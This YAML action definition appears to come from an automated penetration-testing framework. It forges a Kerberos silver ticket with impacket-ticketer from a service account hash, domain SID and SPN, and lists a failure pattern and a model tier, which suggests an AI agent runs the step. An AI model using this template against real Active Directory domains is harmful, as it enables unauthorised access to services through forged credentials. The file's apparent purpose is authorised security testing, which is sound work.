name: silver_ticket
category: ad
description: Forge silver ticket for specific service
preconditions:
  - domain_joined
parameters:
  target_ip: from_engagement.target_ip
command_template: "impacket-ticketer -nthash '{service_hash}' -domain-sid '{sid}' -domain {domain} -spn '{spn}' '{target_user}'"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: "Silver ticket forged for specific SPN using service account hash. No DC contact needed for authentication. Access specific service only (CIFS, HTTP, MSSQL, etc.)."
